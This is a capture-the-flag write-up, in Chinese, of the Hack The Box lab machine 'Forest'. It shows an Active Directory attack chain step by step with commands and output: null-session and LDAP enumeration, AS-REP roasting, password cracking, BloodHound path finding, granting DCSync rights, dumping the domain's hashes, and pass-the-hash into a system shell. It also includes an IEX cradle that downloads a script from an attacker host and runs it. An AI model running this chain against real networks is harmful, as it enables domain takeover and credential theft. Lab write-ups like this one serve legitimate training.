# 扫描

```shell
> sudo nmap --min-rate 10000 -p- 10.10.10.161
[sudo] password for tel:
Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-31 16:54 CST
Warning: 10.10.10.161 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.10.10.161
Host is up (0.19s latency).
Not shown: 65512 closed tcp ports (reset)
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49671/tcp open  unknown
49676/tcp open  unknown
49677/tcp open  unknown
49684/tcp open  unknown
49703/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 12.69 seconds

> sudo nmap -sC -sV -p53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49671,49676,49677,49684,49703,49925 10.10.10.161
Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-31 17:08 CST
Nmap scan report for 10.10.10.161
Host is up (0.18s latency).

PORT      STATE SERVICE      VERSION
53/tcp    open  domain       Simple DNS Plus
88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2023-07-31 09:15:56Z)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp   open  ?          Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf       .NET Message Framing
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49671/tcp open  msrpc        Microsoft Windows RPC
49676/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
49677/tcp open  msrpc        Microsoft Windows RPC
49684/tcp open  msrpc        Microsoft Windows RPC
49703/tcp open  msrpc        Microsoft Windows RPC
49925/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2h26m49s, deviation: 4h02m31s, median: 6m48s
| smb2-time:
|   date: 2023-07-31T09:16:48
|_  start_date: 2023-07-31T08:59:28
| smb-security-mode:
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
| smb-os-discovery:
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: FOREST
|   NetBIOS computer name: FOREST\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: FOREST.htb.local
|_  System time: 2023-07-31T02:16:51-07:00

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 78.53 seconds
```

需要注意的有趣端口：

- Kerberos (88/TCP) — Windows Kerberos 协议服务。
- LDAP (389/TCP) — 活动目录 LDAP。
  - LDAP 通常提供有关 AD 的详细信息。而如果允许匿名绑定，我们就可以查询到很多好的 AD 信息，比如用户信息。
- SMB (445/TCP) — Windows Server 消息块 (“SMB”) 协议。
  - 对于 SMB，检查它是否允许空会话总是好的。如果允许，我们可以像 LDAP 一样枚举许多有用的 AD 信息。
- WinRM (5985/TCP) — WS 管理协议的 Microsoft 实现。
  - 这可以允许通过 PowerShell 进行远程连接。

# 445 SMB

![](https://pic.l1nyz-tel.cc/202307311715537.png)

# 445 RPC

空身份验证来连接 rpc

可以列出用户和用户组

```shell
> rpcclient -U "" -N 10.10.10.161
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[DefaultAccount] rid:[0x1f7]
user:[$331000-VK4ADACQNUCA] rid:[0x463]
user:[SM_2c8eef0a09b545acb] rid:[0x464]
user:[SM_ca8c2ed5bdab4dc9b] rid:[0x465]
user:[SM_75a538d3025e4db9a] rid:[0x466]
user:[SM_681f53d4942840e18] rid:[0x467]
user:[SM_1b41c9286325456bb] rid:[0x468]
user:[SM_9b69f1b9d2cc45549] rid:[0x469]
user:[SM_7c96b981967141ebb] rid:[0x46a]
user:[SM_c75ee099d0a64c91b] rid:[0x46b]
user:[SM_1ffab36a2f5f479cb] rid:[0x46c]
user:[HealthMailboxc3d7722] rid:[0x46e]
user:[HealthMailboxfc9daad] rid:[0x46f]
user:[HealthMailboxc0a90c9] rid:[0x470]
user:[HealthMailbox670628e] rid:[0x471]
user:[HealthMailbox968e74d] rid:[0x472]
user:[HealthMailbox6ded678] rid:[0x473]
user:[HealthMailbox83d6781] rid:[0x474]
user:[HealthMailboxfd87238] rid:[0x475]
user:[HealthMailboxb01ac64] rid:[0x476]
user:[HealthMailbox7108a4e] rid:[0x477]
user:[HealthMailbox0659cc1] rid:[0x478]
user:[sebastien] rid:[0x479]
user:[lucinda] rid:[0x47a]
user:[svc-alfresco] rid:[0x47b]
user:[andy] rid:[0x47e]
user:[mark] rid:[0x47f]
user:[santi] rid:[0x480]


rpcclient $> enumdomgroups
group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]
group:[Domain Admins] rid:[0x200]
group:[Domain Users] rid:[0x201]
group:[Domain Guests] rid:[0x202]
group:[Domain Computers] rid:[0x203]
group:[Domain Controllers] rid:[0x204]
group:[Schema Admins] rid:[0x206]
group:[Enterprise Admins] rid:[0x207]
group:[Group Policy Creator Owners] rid:[0x208]
group:[Read-only Domain Controllers] rid:[0x209]
group:[Cloneable Domain Controllers] rid:[0x20a]
group:[Protected Users] rid:[0x20d]
group:[Key Admins] rid:[0x20e]
group:[Enterprise Key Admins] rid:[0x20f]
group:[DnsUpdateProxy] rid:[0x44e]
group:[Organization Management] rid:[0x450]
group:[Recipient Management] rid:[0x451]
group:[View-Only Organization Management] rid:[0x452]
group:[Public Folder Management] rid:[0x453]
group:[UM Management] rid:[0x454]
group:[Help Desk] rid:[0x455]
group:[Records Management] rid:[0x456]
group:[Discovery Management] rid:[0x457]
group:[Server Management] rid:[0x458]
group:[Delegated Setup] rid:[0x459]
group:[Hygiene Management] rid:[0x45a]
group:[Compliance Management] rid:[0x45b]
group:[Security Reader] rid:[0x45c]
group:[Security Administrator] rid:[0x45d]
group:[Exchange Servers] rid:[0x45e]
group:[Exchange Trusted Subsystem] rid:[0x45f]
group:[Managed Availability Servers] rid:[0x460]
group:[Exchange Windows Permissions] rid:[0x461]
group:[ExchangeLegacyInterop] rid:[0x462]
group:[$D31000-NSEL5BRJ63V7] rid:[0x46d]
group:[Service Accounts] rid:[0x47c]
group:[Privileged IT Accounts] rid:[0x47d]
group:[test] rid:[0x13ed]
```

# 389 LDAP

Ldap 匿名访问

值得试一下有没有开启匿名访问

根据 nmap 探测出的结果可以知道域名为`htb.local`

尝试使用 ldapsearch 工具对 `namingcontexts` 字段进行发掘

```shell
ldapsearch -H ldap://10.10.10.161:389 -x -b "CN=users,DC=htb,DC=local"

ldapsearch -H ldap://10.10.10.161:389 -x -b "DC=htb,DC=local"
```

这一步主要也是用来获取域中的用户名信息

# GetNPUsers.py 空身份验证直接获取哈希

拿到账号名之后，可以检查一下是否启用了预认证，这里解释一下什么是预认证

> 在请求 TGT（票证授予票证）时，第一步，请求方（用户）使用自己的 NTLM 哈希加密时间戳，并将其发送到 KDC（密钥分发中心），即域控制器。现在，如果 KDC 使用请求用户的 NTLM 哈希成功解密时间戳，KDC 将知道请求用户是有效用户。  
> 可以禁用此检查（这不是默认情况）。在这种情况下，KDC 不会验证请求 TGT 的用户是否有效，而是将 TGT 发送回请求者。  
> 该 TGT 包含使用请求用户的 NTLM 哈希加密的部分数据，这意味着我们可以将哈希脱机并尝试破解它。

使用 `GetNPUsers.py` 尝试获取每一个用户的 hash

`for user in $(cat users.txt); do python3 /tools/impacket/examples/GetNPUsers.py -no-pass -dc-ip 10.10.10.161 htb/${user}; done`

```shell
> for user in $(cat users.txt); do python3 /tools/impacket/examples/GetNPUsers.py -no-pass -dc-ip 10.10.10.161 htb/${user}; done

[*] Getting TGT for svc-alfresco
$krb5asrep$23$svc-alfresco@HTB:c0a33cbe946dc9150025ee60c9e72029$142fd02f6bf91c62f6ebc21b359b1c888466a2dd1d5301638d88dd6925ed835ccd9786bf8aa884f2d95326d70c25e6a1bce72155f05e83b32cee0f30602063d628d21c0a51aca73928749ae3adb70523fd4aa843329cff4f7699ca701e5ae64a6bcec0dec5e6b5180e26e7c3eb58342002497cb2a2dd5348a4646f3d041d3db7d43d050793158cbf9a4b0e652deca1b72757a96ab8d322221c7baa20ac02c6112958658da0cd8d98f758145c1073e910cde77665579fb48bac2ad77b37b9e00b1712c58f1d8ac644cf29efd45a5a9211a708deab0553b0b2a289f9ccee25976d
Impacket v0.10.1.dev1+20230728.114623.fb147c3f - Copyright 2022 Fortra
```

离线哈希爆破

```shell
> john -w=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
s3rvice          ($krb5asrep$23$svc-alfresco@HTB)
1g 0:00:00:02 DONE (2023-07-31 17:58) 0.3649g/s 1491Kp/s 1491Kc/s 1491KC/s s521379846..s3r2s1
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

`sudo evil-winrm -i 10.10.10.161 -u svc-alfresco -p s3rvice` 连接获取 user.txt

# BloodHound

```shell
upload SharpHound.exe
./SharpHound.exe
download 20230731031327_BloodHound.zip
download MzZhZTZmYjktOTM4NS00NDQ3LTk3OGItMmEyYTVjZjNiYTYw.bin

sudo neo4j console
bloodhound
```

导入 zip 数据库文件即可

![](https://pic.l1nyz-tel.cc/202307312229710.png)

找到到达 Domain Admins 最短路径，看到可以 `DCSync`

![](https://pic.l1nyz-tel.cc/202307312227002.png)

![](https://pic.l1nyz-tel.cc/202307312233245.png)

![](https://pic.l1nyz-tel.cc/202307312235947.png)

![](https://pic.l1nyz-tel.cc/202307312247360.png)

发现目前获取的 svc-alfresco 用户，属于 `service account` 这个组的成员，又是 `Privileged IT Accounts` 的成员，又是 `ACCOUNT OPERATORS` `EXCHANGE WINDOWS PERMISSIONS` 的成员  
拥有 `WriteDacl` 权限，用户能够添加 `DACL`（自由访问控制列表）

当前拥有 `WriteDacl` 权限，没有 `DCSync` 权限。可以自己写入 `DCSync` 权限，然后 dump 管理员的 hash，最后进行 PTH 票据传递攻击

# 权限提升

从当前的 svc-alfresco 访问权限到位于 Domain Admins 组中的 Adminsitrator，需要进行两次跳转

## 加入 Exchange Windows Permissions Group

右键点击 GenericAll 查看 help 即可获取具体的指导

![](https://pic.l1nyz-tel.cc/202307312300659.png)

添加一个账户 `net user tel tel@123 /add /domain`  
将其添加到 Exchange Windows Permissions 中 `net group "Exchange Windows Permissions" tel /add`

![](https://pic.l1nyz-tel.cc/202307312315654.png)

## Dsync

此时 teltel 用户已在 Exchange Windows Permissions 中，再进行 DCSync 权限的添加

利用这个 [github 仓库](https://github.com/PowerShellMafia/PowerSploit)，Add-ObjectACL 模块可以添加 DCSync 权限

```shell
IEX(New-Object Net.WebClient).downloadString('http://10.10.16.13:1234/PowerView.ps1')
$pass = convertto-securestring 'teltel123!' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential ('HTB\teltel', $pass)
Add-DomainObjectAcl -Credential $cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity teltel -Rights DCSync
```

### DCSync 攻击前提

原理: 在**具备域管理员权限条件**下，攻击者可以**创建伪造的域控制器**，将预先设定的对象或对象属性复制到正在运行域服务器中。

一个用户想发起 DCSync 攻击，必须获得以下任一用户的权限：

- Administrators 组内的用户
- Domain Admins 组内的用户
- Enterprise Admins 组内的用户
- 域控制器的计算机帐户

## secretsdump

具有 DCSync 权限的用户，可以使用工具直接导出管理员账号 hash

```shell
> python3 secretsdump.py 'teltel:teltel123!@10.10.10.161'
Impacket v0.10.1.dev1+20230728.114623.fb147c3f - Copyright 2022 Fortra

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
......
EXCH01$:1103:aad3b435b51404eeaad3b435b51404ee:050105bb043f5b8ffc3a9fa99b5ef7c1:::
[*] Kerberos keys grabbed
htb.local\Administrator:aes256-cts-hmac-sha1-96:910e4c922b7516d4a27f05b5ae6a147578564284fff8461a02298ac9263bc913
htb.local\Administrator:aes128-cts-hmac-sha1-96:b5880b186249a067a5f6b814a23ed375
htb.local\Administrator:des-cbc-md5:c1e049c71f57343b
......
teltel:des-cbc-md5:92436bdf92e561e6
FOREST$:aes256-cts-hmac-sha1-96:4b2b5c545bc8992ed58858196321d6ff41383f44e81fff11d06b341b6ecdd25f
FOREST$:aes128-cts-hmac-sha1-96:3dafdea2b62f964ae532c8987fd99663
FOREST$:des-cbc-md5:c8132fbf73c71fa8
EXCH01$:aes256-cts-hmac-sha1-96:1a87f882a1ab851ce15a5e1f48005de99995f2da482837d49f16806099dd85b6
EXCH01$:aes128-cts-hmac-sha1-96:9ceffb340a70b055304c3cd0583edf4e
EXCH01$:des-cbc-md5:8c45f44c16975129
[*] Cleaning up...
```

# pth 哈希传递

crackmapexec 用来检测 hash 是否有效，出现 **Pwn3d!** 即为成功

```shell
> crackmapexec smb 10.10.10.161 -u administrator -H aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6
SMB         10.10.10.161    445    FOREST           [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True)
SMB         10.10.10.161    445    FOREST           [+] htb.local\administrator:32693b11e6aa90eb43d32c72a07ceea6 (Pwn3d!)
```

`C:\Users\Administrator\Desktop` 读取 root.txt

```shell
> python3 psexec.py htb.local/Administrator@10.10.10.161 -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6
Impacket v0.10.1.dev1+20230728.114623.fb147c3f - Copyright 2022 Fortra

[*] Requesting shares on 10.10.10.161.....
[*] Found writable share ADMIN$
[*] Uploading file HOKKpTfO.exe
[*] Opening SVCManager on 10.10.10.161.....
[*] Creating service Wohr on 10.10.10.161.....
[*] Starting service Wohr.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32> dir
```
